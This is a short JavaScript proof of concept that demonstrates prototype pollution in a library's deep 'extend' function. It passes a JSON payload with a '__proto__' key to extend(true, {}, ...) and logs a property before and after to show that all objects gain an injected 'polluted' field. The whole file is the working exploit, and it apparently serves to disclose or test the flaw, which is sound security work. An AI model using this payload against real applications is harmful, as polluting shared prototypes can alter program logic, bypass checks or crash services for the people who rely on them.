import * as e from "./index-rest.js"
console.log("Before " + {}.polluted)
e.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "polluted"}}'))
console.log("After: " + {}.polluted)
